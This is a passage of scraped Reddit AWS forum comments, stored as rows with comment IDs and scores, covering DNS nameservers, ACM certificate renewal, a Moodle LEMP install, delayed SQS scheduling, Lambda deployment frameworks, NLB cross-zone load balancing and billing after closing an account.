Paid Support eat on a priority ticket for 4 days without even assigning it to anyone while I was trying to patch that hole.

Now that it's patched, everything is fine except for someone using a Google bot trying to find a way in again.",2.0
g69s6v2,ixt6b9,Thank you for sharing details. Good luck with your service!,2.0
g69wblt,ixt6b9,"So far everything is running smoothly again, so thanks. :)",2.0
g68orre,ixspb7,"If you only transferred the domain, you'll still need to update your registrar if you haven't already to point at route53's nameservers. What does `nslookup -q=ns my-domain.com` return?

(hopefully that's the correct syntax, I use Windows so `-q=ns` is doing a query for the nameserver)",7.0
g68wvke,ixspb7,"Thanks!  -a did not work but -q did.

I was given:
ns2.peer1.net
ns1.peer1.net

which was incorrect, I changed them to the 4 aws nameservers and it seems like the domain is working now.

It also seems like I'm getting different results locally vs. some fresh ec2 instances so some stuff might be cached on my local machine making things more confusing.  ¯\_(ツ)_/¯



Really appreciate the help Chuck!",1.0
g68slyq,ixspb7,"Bear in mind even after updating nameservers, it will take quite a while to propagate. 

You can use https://dnschecker.org/ to check the propagation",3.0
g68ux11,ixsiqf,"Yes, you can create alarms based on cpu usage : https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/US_AlarmAtThresholdEC2.html

And then via the alarm, you can configure the action for example to reprovision.

I would suggest to use autoscaling for your ec2 and have a scaling policy based on cpu usage to reduce downtime. Set minimum&amp;desired size to 1 and maximum size to 2.",1.0
g68vmrw,ixsiqf,"If it uses more ram than is available normally the oom killer will kill whatever is using the ram.

If it uses more cpu, it'll just go slow. If it keeps using more cpu it'll go really slow.

You need to look at your log files or system monitoring and see wtf is going on with the instance and probably then fix it there.

Eg if 1minute load average goes over double the number of cpus : kill the process with highest cpu utilisation.

If it's a ram issue, get the oom killer working.

If you want AWS to detect the condition, you'd have to know what it is you're looking to detect. Cpu/ram/other fault. And then maybe you can figure it out. You might be able to use the instance reachability test but I haven't found them very reliable. Stuff can break and it is still reachable for a long time before it notices.",1.0
g68luld,ixrw03,"Go to ACM to see what DNS record (CNAME) needs to be in place.

Add that record to Route53 or whatever the authoritative name server for that domain is.

Wait an hour (ish) and your domain should be renewed.",7.0
g68qd47,ixrw03,"Awesome. That was super helpful, I think I got it now. Any chance that ACM certificates are zone-specific i.e US-East-1? For some reason ACM was only showing one certificate previously, and then I'm not sure what I did, but then it showed four certificates and I remember seeing something about US-East-1. I've moved from the east coast to the west coast and recall switching zones for a new website, but that shouldn't impact the old ones?

edit: yup! Renewal confirmed :) &lt;3",1.0
g68qzdk,ixrw03,ACM certs are region specific. The validation record will apply to all regions.,2.0
g68m8ku,ixrw03,"My two cents:

* Log in to the aws console
* Since I suspect you're using the certificate on a cloudfront, the certificate will be in us-east-1, switch to that region
* Switch to the service ""Certificate Manager"" or something. You can find this by typing certificate in the services dropdown
* Now you -should- see a list with all the certificates you're having. Click on the one that's about to expire
* The certificate manager is looking for a certain set of DNS records to check that the domain which you're having the certificate for is still yours. Those DNS records seems to have disappeared so that AWS cannot automatically renew the certificate
* Take note of the dns records needed, switch to the route53 service, and add them in. Note: sometimes there is a special button ""Add to route53"" which will do the work for you.

Exceptions:

* When the dns of the domain is not in control (anymore) of route53, you'll have to add the dns records wherever you can control the dns (@namecheap, perhaps?)

Quite possible I've been unclear here and there, I did not proof read",1.0
g68q42g,ixrw03,"Plain English:

AWS Certificate Manager requires a CNAME, a type of DNS record, to be present and correctly configured in order to renew the HTTPS certificate you have set up.

You likely deleted it by mistake from your hosted zone in Route 53. Run through the ACM setup process again.",1.0
g68if6b,ixp10f,What issues are you having. It's a pretty simple LEMP stack install. I can do it for you if you'd like??,1.0
g6are60,ixp10f,"Hi leffer\_media,

Thank you for responding and your kind offer of assistance. It reminds me of the old adage, Give  man a fish, feed him today. Teach a man to fish, feed him for a lifetime!"" 

I have been building LAMP stacks using the Amazon Linux image. I tried first with the regular AW Linux stack, but it created an error with Moodle because the PHP version didn't match (too old).

I then tried the AWS Linux 2 image which is preconfigured with PHP 7. I managed to get to the Moodle web page that begins the final configuration step through your browser. When I reach the page that asks for Database Settings, all is well until I reach the Database port and Unix socket. I used '3306' for the DB port and 'localhost' for the Unix socket. Whereupon I get this error message:

 \- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Error: database driver problem detected

The site administrator should verify server configuration.

PHP has not been properly configured with MySQLi extension for it to communicate with MySQL. Please check your php.ini file or recompile PHP.

  \- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

All of the documentation and tutorials I have waded through just don't seem to make any difference even though I have followed them to the letter. I tried '/tmp/mysql.sock' as the Unix port with exactly the same error message.

 I have found other people raising this issue, so I am not alone in this. But, if they get help on a forum or a blog they never share what they did to resolve the problem. The data exchange just stops, case closed.

I will look for a LEMP tutorial and give this a try today. Thank you again, for suggesting a new path to follow. I'll provide feedback on my efforts in this thread after I have given it a go (or two).",1.0
g6ayw15,ixp10f,That means you need to install PHP-mysqli. This is usually something like ‘yum install PHP-mysqli’,1.0
g6b3l74,ixp10f,"I've just followed a tutorial for a Moodle install on a LEMP stack from: [https://draculaservers.com/tutorials/install-moodle-ubuntu-nginx/](https://draculaservers.com/tutorials/install-moodle-ubuntu-nginx/)

Everything was going great until I once again hit the dreaded **Database Settings** page. Once again I received an error:

 \- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Error: Database connection failed

It is possible that the database is overloaded or otherwise not running properly.

The site administrator should also check that the database details have been correctly specified in config.php

**Warning**: mysqli::\_\_construct(): (HY000/1698): Access denied for user 'james'@'localhost' in **/var/www/html/moodle/lib/dml/mysqli\_native\_moodle\_database.php** on line **83** 

 \- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

This tutorial says to leave the Database port &amp; Unix socket empty and click Next.

I will also take a look at my previous server (I still have this instance available) and install PHP-mysqli as you suggest.",1.0
g6b3x4d,ixp10f,"I should also add that the tutorial says to install PHP7.1, which I did. However, the Moodle Latest Release webpage lists the requirements for the latest Moodle version 39 as: PHP 7.2, MariaDB 10.2.29.

Could this cause a problem?",1.0
g6b5rnw,ixp10f,"That could be, but if you look at the error it's having trouble with the credentials supplied. Make sure the user has access to that database.",1.0
g6bhjtv,ixp10f,"Warning: mysqli::__construct(): (HY000/1698): Access denied for user 'james'@'localhost'

Do you have a MySQL server installed on that local host instance with a user named James in MySQL with permissions granted (and flushed)?",1.0
g6bu11s,ixp10f,"Hi Dramatic-Blueberry99,

&amp;#x200B;

Yes, done and flushed. But, I think I have cracked it. Nobody mentioned having to edit the config-dist.php file.",1.0
g6buuvu,ixp10f,"Ha! I finally solved the problem. A massive thank you goes to leffler\_media for pointing me to a LEMP stack. Also the tutorial I mentioned previously ([https://draculaservers.com/tutorials/install-moodle-ubuntu-nginx/](https://draculaservers.com/tutorials/install-moodle-ubuntu-nginx/)) was very good to a point. BUT there is a HUGE omission. Which is, nowhere is there any mention made of editing the config-dist.php file. I struggled with this for hours until I found some data on how to do this. Only after editing the contents of this file was I able to finally get to the Moodle Server Checks screen. 

Here I discovered that there were two issues with Moodle 3.9: 

1. The MariaDB - version 10.2.29 is required and you are running 10.1.44 and;  

2. PHP - version 7.2.0 is required and you are running 7.1.33.17.18.04.1.1  

I will get this fixed. But, I do wish some kind-hearted soul would update their installation tutorials when a new version of Moodle is launched. This has been a nightmare!

Thank you to everyone on this thread who chipped in to help. You guys make life worth living ...

James",1.0
g6917qp,ixqzeq,I’ll have to take a look. I’ve been planning to use Step Functions.,5.0
g69wyoh,ixqzeq,"Hey man, good to hear! Regarding step functions, we actually talk about that as an option in the article above. A summary of why we didn't think it was good enough :

* Scaling limits. Step functions have a max limit of 1 million waiting tasks.
* Cost. A simple state machine for a scheduled task requires 3 state transitions. So a million scheduled tasks would cost $75 with step functions, which doesn’t include the cost of Lambda or other peripheral services like CloudWatch logs.
* Testing. Overall development cycle requires 30 seconds to package, upload, and deploy a new stack. This is followed by a number of clicks on the UI to find and debug your latest execution. Also many issues you face are in setting configuration settings of the state machine, which can’t be executed locally.

You should also take a look at this article here that weighs pros and cons of step functions here:

[https://blog.scottlogic.com/2018/06/19/step-functions.html](https://blog.scottlogic.com/2018/06/19/step-functions.html)

If step functions don't work out, and you'd like to try our API's out instead let us know! Our API's are free to use, and we'll gladly help you get up and running quickly. Let us know here or contact us at [info@schedulerapi.com](mailto:info@schedulerapi.com). Happy hacking and good luck!",2.0
g68j5d7,ixqzeq,Using temporal is another option.,2.0
g6934re,ixqzeq,"&gt;temporal

What is that? Googled a bit, can't find what you're referring to.",3.0
g69lq0i,ixqzeq,"temporal.it

it’s new (ish)",1.0
g69lysc,ixqzeq,It's an insecure webpage that makes me remember the days of dial up. Is that the right domain?,1.0
g69x564,ixqzeq,"Hey paddyspubkey, thanks for sharing this alternative. I took a look and the website appears broken? But if there is another option, we'd love to know!",1.0
g69xtkw,ixqzeq,oh my bad. should be temporal.io,1.0
g691nzq,ixqzeq,"Write message to a ddb table, then have a timed lambda to restore them to an sqs queue (or send direct to your destination) after X time. Use a sort key as time, hash key could be the day/hour. Only need to set the TTL after the message has been restored.

Edit: But for people that want an out of the box solution, hopefully your offering will help them :-)",2.0
g693ely,ixqzeq,This doesn't allow for a per message scheduling though.,1.0
g693s3t,ixqzeq,Does it need to? Would seem a once per minute passes would be fine for most messaging/retry needs. Once per hour/day passes would be fine for most business events.,1.0
g696tkq,ixqzeq,"Why wouldn't it? just store when you want the message sent.

As the other commenter indicated, the lambda checking for any due events once per minute should be enough.

If you want finer grained then there are ways to do that too",1.0
g6kremf,ixqzeq,"That's a solution we looked at - using CloudWatch combined with DynamoDB to store scheduled messages and Lambda functions to put it back on the queue. When we tried this approach, there were two main issues:

1) Hotspots - Let's say a scan of the table runs at 00:00 and has too many scheduled events to process. The lambda then might not finish in time for the next run at 00:01. This causes the next run to get delayed, and scheduled events to miss. This delay then starts cascading to all future runs and you could end up with massive delays.

2) Precision - Cloudwatch scans are run once per minute, so anything more precise than that won't be covered by this. But maybe that's enough precision for a lot of use cases.

There's an article that discussed this here:

[https://theburningmonk.com/2019/05/using-cloudwatch-and-lambda-to-implement-ad-hoc-scheduling/](https://theburningmonk.com/2019/05/using-cloudwatch-and-lambda-to-implement-ad-hoc-scheduling/)",2.0
g696v3h,ixqzeq,Love it. Just what I needed! Thank you.,1.0
g69x8of,ixqzeq,"Hey man, thank you and np. If you are looking to use this, it's free to use, and we will help hand-hold you through to getting your first calls up and running quickly. Let us know here or at [info@schedulerapi.com](mailto:info@schedulerapi.com). Good luck!",1.0
g697lg1,ixqzeq,Have you looked at message visibility?,1.0
g69xoue,ixqzeq,"Hey, yes thats a good callout. We looked at that but with message visibility there are two issues:

1. Scaling. There are at most 120,000 messages that can be invisible (in-flight) at a time.
2. 12 hour limits. Anything beyond this requires you to build a solution for it.",3.0
g69zev9,ixqzeq,I see thanks.,1.0
g8ihecn,ixqzeq,"Maybe consider that the “15 minute limit” isn’t actually a limit of SQS, but of how you’re using it? You can set the “visibility timeout” of a message to manage delayed delivery and get the result you’re looking for without the complexity of any external storage or other service involvement. I’ve written about good and bad patterns of SQS usage here: https://link.medium.com/jQ2mmR8hvab",1.0
g693t1f,ixqddt,"How about SOBR (scale out backup repository) tiering to S3?

Requires Veeam B&amp;R enterprise though",1.0
g69q0i0,ixqddt,"Replied in the Veeam sub too. SOBR is the way to go. Setup with move and copy mode to get your local and long term retention. Even with GFS, all in 1 job.",1.0
g6970ae,ixqddt,"VTL is what I wished I could use, because the iSCSI approach was costly in terms of S3 storage and in terms of local storage (The caching volume needs to be pretty big to deal with those .vib and .vbk files).  The VTL solution doesn't work if you're not running the Enterprise version, because incremementals can't happen properly.  The enterprise version will perform differential backups to tape, whereas the lesser versions re-write the full backup to tape each time, which makes no sense at all.  


In the end I ended up with 30TB of data in S3 and made the people who pay the bills very unhappy.  There's a very good chance that my solution was poorly architected, (okay, it was poorly architected) but I feel like every better alternative was blocked by my Veeam license.",1.0
g68ddfd,ixqc6t,I recommend using AWS Batch for this workflow. [https://aws.amazon.com/blogs/compute/gpu-workloads-on-aws-batch/](https://aws.amazon.com/blogs/compute/gpu-workloads-on-aws-batch/),7.0
g692193,ixqc6t,Yep.  He’s describing batch.,1.0
g68b8y4,ixqc6t,"If you're running the process with python, you could use boto3 to interact with the ec2 api.  You'd need to attach an IAM role to the instance, giving it only as much access as it needs to carry out its task.  Then at the end of your process, you could make a call to the ec2 api to shutdown the instance.

Lambda can do the job, but depending on how you are dealing with the gpu instance, you could have it run the script as user data on every restart:

https://aws.amazon.com/premiumsupport/knowledge-center/execute-user-data-ec2/",2.0
g6853ij,ixqc6t,"Stop is easy. You can have script running on the instance and look for a flag (which will be set up on your Python program exit). 

Start is challenging. You need an external indicator to figure this out. Can be done with Lambda + S3 or SNS to trigger the event. 

If you are open for commercial solution, [INVOKE Cloud](http://invoke.cloud) might be able to help. NOTE: I am co-founder.",1.0
g6ay23p,ixqc6t,Could you specify why start will be challenging.,1.0
g6bo4mq,ixqc6t,"Because you need to know when to start, is it scheduled start (or) activity based start? If scheduled start, not a big deal. If activity based start, like file copied to S3 or etc., you need to monitor for that action then trigger the start call.",1.0
g68r5td,ixqc6t,"We use the run\_instances API (from the boto library in Python, but it exists in many other languages) to start an instance which will terminate on shutdown. We put some basic glue script in the userdata- usually to pull in some secrets, clone a repo and run a script, or sometimes to pull and run a docker image. You can also set up the AMI in advance to take care of heavy dependencies which you don't want to rebuild each time. Logs are piped into a file and synched with CloudWatch using the agent. We schedule and spawn these jobs using lambda.

It sounds like your process has a few more steps so I would look at orchestrating it using step functions, and maybe think about something like ECS instead of EC2 if it makes sense to have a cluster (but imo it often doesn't!).",1.0
g68ydhc,ixocei,"I've always been skeptical of solutions like this. AWS isn't the first to offer a product like this (Cloudcraft was one of the first IIRC, I know Lucidchart added it in the past year or so). 

My chief concern is that looking at resources in an auto-generated top-down view doesn't really give you insight into how systems integrate or work together. That is the real value added by an architecture diagram. 

Seems like a double-edged sword to me, a good starting point or for ""infrastructure archeology,"" but not a magic bullet for documentation.",13.0
g692odd,ixocei,A lot of detail is glossed over by just an arrow between boxes in these kinds of diagrams.,5.0
g6a66s5,ixocei,"Yeah, I got driven crazy by how much disagreement you could have even within a single diagram as to what an arrow meant.

I ended up writing a page in our internal wiki about the meaning of arrows and came up with a standardized legend explaining the meaning to be pasted into new diagrams. From the feedback it got it became apparent I wasn't the only one who had been struggling.

I'm not talking UML levels of visual grammar either, I just got tired of arrows that obscured the difference between physical and logical flow, and direct vs indirect (eg via a message bus) connections.",2.0
g69355n,ixocei,"Cost estimation over $500/month. Umm, okay.",17.0
g69a9r7,ixocei,"Do you have to leave it running? Spin it up for an hour, export what diagrams you want and then shut it down would cost &lt;$1.

Even then, $500 for up to date diagrams is probably worth it over making it someone's job to do it.",4.0
g69bqxd,ixocei,"Well, deployment takes about 30 mins, so you’d have to figure out a nice shutdown and startup procedure if you don’t want to wait. Don’t get me wrong, the technical implementation looks great, but there are open source tools out there who do something similar for free and commercial ones for less money. I just want to put this into perspective. If this gets tweaked a bit and gets some added capabilities, I see potential.",3.0
g69wq4l,ixocei,I'm looking for something like this - I just want to view my VPC or account in a diagram to make sure I didn't leave anything unintentional running. What are the free / self solutions ?,1.0
g6ahl88,ixocei,"Cloud mapper is probably the most common one. https://github.com/duo-labs/cloudmapper  
Not as shiny, but does the job.",1.0
g69b21p,ixocei,"Uses elastisearch, so I think you’d either have to resize it to a smaller instance to save costs or rebuild it each time.",1.0
g698wl1,ixocei,I was hoping it would just be a different screen in the console (like Cost Explorer?) but you have to deploy a whole thing CF thing and then there's usage charge. My environments don't change often nor are they large so probably overkill for me.,3.0
g6bm2br,ixocei,"any time you see the work ""Solution"" from AWS, you should expect an overcomplicated pile of cloud formation put out by the SA/TAM org, not a fully fleshed product, because theyre connecting pieces of missing product features",5.0
g68l1ap,ixocei,Deploying it right now to an account. Seems interesting... might help our oncalls quickly get a perspective of the architecture without manually maintaining an architecture diagram.,2.0
g69bpx5,ixocei,Watch out for costs - it sets up elasticsearch for instance which isn’t pay per use.,2.0
g69i730,ixocei,Yeah after looking at the costs I decided it wasn't worth it and just shut it down.,4.0
g7ayqpj,ixocei,"What do you mean by “which isn’t pay per use?” As in, an hourly rate like most other AWS services?",1.0
g7b73yy,ixocei,"Sorry as in pay per query/use etc like lambda, DynamoDB, s3 etc.",1.0
g7cbjm8,ixocei,"Ah, yeah. I wish.",1.0
g6ao89z,ixocei,"Just my 2 cents:

Most companies that use AWS ""properly"" have a requirement to maintain an environment in almost exactly the same way over the course of an year (or more). So from my point of view, a solution that requires paying 500 USD/month is not something worthwhile.


Maybe, just maybe, if it was offered as a service (instead of deploying and maintaining a full-fledged solution) through a normal cost logic (for idk, less than 100 usd/month) it would allow adoption of more companies.",1.0
g69qht0,ixocei,"Possible use an existing elastic search instance as a way to reduce costs. 

But agree, this stuff should just part of the base offering.",1.0
g6840z6,ixn9wb,"You probably have your rules out of order, so when they request the new path, they get another 3xx redirect. You'll have to post all of your rules if you want someone to help more.",1.0
g67qsfp,ixm619,I've run Vault in ECS/Fargate; ec2 wouldn't be any different. DynamoDB is a good storage backend since it supports HA and is self-backing up.,1.0
g67qxof,ixm619,Would you care to write up some simple step guide for this?,1.0
g68rwsi,ixm619,"Meta question,  why? 

I’ve used Vault for on prem implementations. But  never had a use case in AWS. 

Second question, why Fargate? If I did need to use Vault for some reason, it would be cheaper to just run it in an ASG with EC2 with a minimum of 3 (3 for HA, an odd number for consensus). I don’t see any downsides.",1.0
g69odoj,ixm619,"that's the current setup (ASG 1min 3 max in EC2), and we would like to test it against dockerized vault if it could cut down more cost.",1.0
g6abiu5,ixm619,Fargate costs more than EC2.,1.0
g6abni2,ixm619,"Hence why, my target is ecs on ec2 not fargate",1.0
g68b5gf,ixmifw,Amazon Athena is managed Apache Presto.  Does presto have existing solution that works for you?,2.0
g6aic6e,ixmifw,"That’s a great idea that I’m going to start exploring now, thank you!",1.0
g69j320,ixmifw,"So just released this feature to production last week. Went with the ACE editor for SQL query input. Used bootstrap-table for the results of the query (including export but if you could be exporting millions of rows look at just using S3 presigned URLs to download the CSV results of the query). The backend is ALB -&gt; Lambda that executes the queries and returns a presigned S3 URL to download the query results and inject them into the bootstrap table.

Since queries can take a while to run I suggest having one API call to start the query and return the query ID. Then another API call to check status of the query given the ID. Once the query is in a final state (completed, error, etc) return the S3 presigned URL from the status API. Otherwise return a “still processing message”. Have the status API be called every X seconds to check for completion.",2.0
g6aiaus,ixmifw,"Thanks, that sounds great! Is there a particular reason that “Athena-express” wouldn’t have worked for you?",1.0
g6b07l1,ixmifw,"Never stumbled across it. But our entire lambda backend (this Athena thing Is one small part of the overall app) is in python so we would probably have passed on using node for this. Also a lambda can only return up to 1MB in response to an ALB invocation so a large query result may not fit in the response (hence using S3 results). 

Honestly the backend was super easy to write. The front end took a bit more work to be customized to what we wanted it to look like (it does more than just query, there is a table creation wizard, sample queries, and basic/advanced editors). 

The intent behind the feature is to allow people in our org to query their logs that are being shipped to our central logging account. With this feature, our users don’t require access to the logging account since Lambda can assume a role to run the queries. And we can easily scope permissions since the application knows which accounts users have access to.",1.0
g67xvvk,ixmeso,"It is possible.
Enable billing alerts: https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/monitor_estimated_charges_with_cloudwatch.html#turning_on_billing_metrics

Then you will see a CloudWatch Metric in the us-east-1 region in the All metrics tab, choose Billing, Total Estimated Charge.

You can then add that to your dashboard as a number in the widget.
https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/create_dashboard.html",3.0
g69a98u,ixmeso,"this is what i was thinking as well, i was a little stuck at the region. but after some fiddling around i got it working, i was thinking i'd have to change the region in the top right to see that one metric but you don't.",2.0
g6845f3,ixmeso,"It’s not cloudwatch, but depending on how you use accounts/tags, maybe this quicksight dashboard is useful https://wellarchitectedlabs.com/cost/200_labs/200_enterprise_dashboards/",2.0
g6948p4,ixmeso,"thanks, i have seen this one, looks great!",1.0
g67xbbw,ixmeso,"You could do it but I think it would require some custom coding of a lambda. You'd need to query the current cost usage of the tag, extrapolate out the cost per day, then create a text widget with that value and add it to the dashboard.

Definitely not a simple solution. Too bad the billing metrics pushed to CloudWatch are not more specific.",1.0
g67flt2,ixlskc,"A system or instance status check alarm will not be triggered for disk full or high cpu.  High CPU can be done with a different cloud watch alarm specifically on that metric.

Disk full metrics will require installing the cloudwatch agent as described here: 

https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/metrics-collected-by-CloudWatch-agent.html

I normally test these by creating the alarm for another instance that I can test with then duplicating it for the actual instance.",1.0
g67uqp8,ixlskc,"I mean when instance running but it actually stuck because of fulldisk or overload cpu that we cannot ssh to the instance. I was in this situation several time, the instance got stuck and we had to force reboot or stop/start the instance. 

How can do alarms in above cases, I thought I can achieve that via creating alarm in “Status Checks” tab.",1.0
g6avqwy,ixlskc,"Instance status check is sending an address resolution protocol (ARP) request to the network interface (NIC). Running out of disk space not always cause it to fail, usually it kills some of running processes, daemons i.e. sshd.",1.0
g6ayrms,ixlskc,So is there any reason to not able to ssh into an instance?,1.0
g67ordo,ixliza,"I've seen Serverless (the framework) 

I've seen no framework - just write a lambda in your programming tool of choice using the AWS SDK libraries, and script it with the AWS cli, CF or Terraform. This works pretty well: Don't overcomplicate lambdas, they work well when they are simple.",13.0
g67w2pe,ixliza,And I just learned execution time has increased to 15 minutes. Lambda for the win,3.0
g69ivef,ixliza,"SAMs used for auto deploying your cfn infrastructure. Youll still use cfn + code. But it can bundke up many cfn templates into a master file, then push it all to cloudformation.",2.0
g67g5gs,ixliza,"I would use SAM but theres too much overlap with terraform (which we use heavily) for me to embrace it. I’m afraid we’d end up having to maintain essentially duplicate configurations for production systems, which is a recipe for code drift IMHO",6.0
g67k8ld,ixliza,"I was going to say that Terraform seems more popular than any of these choices, but I'm bias since it's what we use (granted, we made the decision to use it based on how popular it is ¯\\\_(ツ)\_/¯)",4.0
g697tv0,ixliza,"We use sam and terraform, but CDK is amazing.",1.0
g67gy37,ixliza,Its Serverless for me.,4.0
g67i02w,ixliza,"serverless currently has a larger user base.  SAM is 2nd but catching up.  if starting out new, my recommendation would be to learn/use SAM.  i have a feeling it’s going to get an order of magnitude better via “some” form of community enabled extension mechanism(s)/ecosystem when reinvent comes.  the piece serverless has but SAM doesn’t.",5.0
g68o9i3,ixliza,CDK is all you need. Use the typescript version.,5.0
g67pmie,ixliza,"SAM is absolutely fine with launching CloudFormation templates, so I prefer to do complete templates and deploy with those through CI/CD pipelines.",3.0
g68xtbu,ixliza,CDK is the future.,4.0
g67ph32,ixliza,Another vote for TerraForm,5.0
g68foxd,ixliza,"I’ve been using CDK for over a year now. It handles all of my companies CD deployment infrastructure across 8 environments. Hundreds of lambdas among other infrastructure. Can’t say that it is currently used “more”, but I think you’ll see more and more people start to adopt it.",3.0
g692477,ixliza,"I use Terraform exclusively; how anyone can enjoy using anything Cloudformation-based on  a regular basis baffles me, it is so unbelievably slow.",2.0
g6bo96s,ixliza,"No state to maintain, easy rollbacks, (for SAM) awesome integration with CodeDeploy and Auto-Upload to S3. Its quiet slow but can do some cool stuff. 

Yes, Terraform is awesome and modules are even more awesome - wished CloudFormation had a similar concept except for SAR and nested stacks from S3.",1.0
g68m8nz,ixliza,"I've used serverless and terraform.

My team loves serverless for business logic apps with a number of lambdas. I prefer terraform for infra related stuff as it provides a lot more fine grained control (by default all lambdas in a serverless app share the same role. there is a plug-in to undo that, but using that as a default? ....argh!)",1.0
g69q7ne,ixliza,"Serverless framework is dominant because it was basically the first if you weren’t rolling your own. Others are starting to pick up speed, but  they’re still young.",1.0
g6bja61,ixliza,"If you're not a nodejs house then I strongly discourage the use of the cdk.
SAM and Serverless are both fantastic frameworks",1.0
g6935lc,ixh908,How is it different from stack sets?,1.0
g6aq22c,ixh908,"Compared to stack sets, this tool brings the following benefits:

* Deploy everything or a subset of stacks with a single CLI command.
* Easier to configure values for stack parameters and the ability to resolve parameter values at deployment time.
* You can have dependencies between stacks, and the tool ensures that the stacks are created, updated and deleted in the correct order.
* Before deployment, you can review changes to stacks to see how parameter values have changed and the differences between the previous and the new template file. 
* You can use [Handlebars](https://handlebarsjs.com/) templating to create dynamic template files with if-conditions, loops, and other Handlebars features.
* Stacks sets are good for deploying identical stacks to multiple regions and accounts. Takomo can do that as well but have better tools to manage other kinds of infrastructure, like applications consisting of many stacks that have dependencies between them.

I hope this helps to get a better picture of the tool and its features.",2.0
g6c9trz,ixh908,"very nice, thank you.",1.0
g68dp96,ixk814,`Lambda -&gt; SQS -&gt; Lambda` sounds fine to me. Messages could pile up in the queue if they're unable to be processed by the lambda somehow (bad event payload.) There are various strategies to handle those situations.,3.0
g692r3z,ixk814,This.,1.0
g67c7nu,ixk814,"Jep, we use the same principle, only we send the mails from a fargate container that never scales to more than one instance at a time and its only job is to read the sqs queue and send mails.",2.0
g67clmi,ixk814,Did you go for the single instance container approach over lambda just to be able to control the limits? Or were there other reasons?,1.0
g67f8ng,ixk814,"We don't use lambda yet and the code was already there in ecs before fargate, so it was a logical step to put it in fargate.
If we had time to rebuild (which is no need for) then it would've been lambda.",1.0
g67a3f6,ixin3k,"The idea of the encryption SDK is to use envelope encryption. So every time you encrypt a message or data, the SDK generates a random data key for that message and uses it to encrypt the message body. Then it encrypts the key itself with ALL of your providers, and includes those encrypted keys in the header of the message.

As long as any one of those forms of the key can be decrypted from the header, the SDK can retrieve the data key and use that to decrypt the message body.

So the first question: it encrypts with all of them and decrypts with any one of them. I don't know the actual logic of how it selects the provider for decryption but it's probably just in the order they're defined in MultipleProviderFactory.

And the other: You can encrypt more than 4KB (guessing ""4096Kb"" is a typo) without any changes since the body is encrypted/decrypted locally with AES. The 4KB limit is only for the payload to/from KMS, which is just the data key.",2.0
g67rvvk,ixin3k,Thanks ArkWaltz,1.0
g6708fx,ixhlvd,"Ha, looks like I figured it out. Been struggling with this for a few days and couldn't find the answer via the google. I finally make this post, and then figure it out shortly there after.  I added x-ray reporting to my container. Which then confirmed my app ran in 2ms. This squarely pointed to the NLB as the problem. Yet more googling finally led me to the answer:

[https://forums.aws.amazon.com/thread.jspa?messageID=871957&amp;#871957](https://forums.aws.amazon.com/thread.jspa?messageID=871957&amp;#871957)

I'm running only a single container behind the NLB. Since the NLB needs to to have a min of two AZs, only one AZ has a container in it. So the delayed responses where caused by the NLB hitting the empty AZ, timing out then trying the other one.

I enabled Cross-Zone Load Balancing and poof, problem gone.  I'm not quite sure why the healthchecks wouldn't be enough to tell the NLB where the healthy container is...",3.0
g680369,ixhlvd,"Thanks for coming back and letting us know what the issue was.  Many times people like to respond with ""Never mind, I figured it out"".",2.0
g6fovxw,ixhlvd,"Yah, I've seen this too and it's so annoying when you have the same problem. So if i'm gonna talk to myself, I might as well complete the conversation. :)",1.0
g66xrpw,ixgafg,"Contact support (you can still reach them from a closed account) to help with the domain. Since this one is not a contract it should be much less of a hassle for them to turn off autorenew. 

https://console.aws.amazon.com/support/home",15.0
g66y5ya,ixgafg,"Thanks. I contacted them earlier this evening, waiting on a reply.

I navigated this same process the first time with the reserved instance. They had to re-activate the acct, then make changes, then deactivate the account again. In the end it isn't that big of a deal, I just wish I didn't have to go through it all over again. I specifically asked that they check for any additional charges last time and was told I was good to go.",5.0
g6849q8,ixgafg,"domains are not sold by amazon (they are reseller) so sometimes it might be the actualy registrar doing auto-renewal and passes it over to your AWS account.

im not excusing the behavior because to the normal user they cant tell who's the actual registrar, but an analogy would be kind of like a recurring subscription, but you cancelled your credit card, sometimes you're still on the hook for the next charges.",2.0
g66wrw1,ixgafg,How are these still being billed to you? Did you use a personal credit card for company costs?,8.0
g66xp2z,ixgafg,"I switched it to my personal card after the first snafu with the reserved instance. Prior to that it was on the department card, but under my name. I had to forward invoices each month and explain how the charges should be allocated among available funds and so on. This way is simpler, and the remaining charges *should* be small.",2.0
g69r00e,ixgafg,"Ask your bank to reject the charges. Tell them what you told us, and they'll do it. Then get them to block all future charges from Amazon's bank account. (I'm not sure how this affects you if you're an Amazon retail customer.)",2.0
g67bkkf,ixgafg,I don't disagree with your take that closing an account could be made easier (a lot easier) but this is also why you should 1) never use a personal credit card for a recurring business expense 2) always assign the main account contact to a dedicated distribution list on the company domain rather than an individual address.,4.0
g67cyq2,ixgafg,This is why I run a sandbox account for employees to learn and play in.  Not a fan of employees using personal accounts for work related activities.,4.0
g66p09h,ixgafg,"....I mean aws gives you access to an insane amount of operational power, and with that comes costs. It is complicated but they do try to make it generally fairly transparent and often do give credits when accidents happen.

You can spin up and down an ec2 instance and image one, to use at a moments notice. You stated you reserved one until end of year. How is this AWS being unclear? It sounds like you may be an academic researcher. Why would you choose to reserve an instance for an entire year? It may be cheaper but if your institution is paying the bills and isn't owning the account, you're taking on that responsibility. 

Im the first to post here and I'm sorry for not being more sympathetic but these come up a lot and I'm going to forewarn you. There is little sympathy usually for cases were someone clearly brought this on themselves. It isnt Amazon's job to ask you 'are you really really sure?' before you implement their resources.

EDIT: ALWAYS READ THE DEV DOCS BEFORE USING ANY AWS TOOL. These are complex and advanced technical products, the pricing is almost always confusing if you don't understand the functional mechanics of how the product work. If OP had read the Dev Docs it would be very as one of the first main sections that the DNS auto renews, and that you get emailed 45 days in advance about this, with instructions to disable it. https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/domain-renew.html",27.0
g66qc6y,ixgafg,"My rant got a bit rambly, but the main thing that I find absurd about this situation is that you can cancel an account with active services that are still being billed. When you do that, you lose access to disable those services, but they will still auto renew.

The rest of it is UX stuff that really should be better executed, like a more centralized billing system, or some way to verify which services are still running. But you're right that those aren't flaws so much as frustrating arbitrary hurdles.

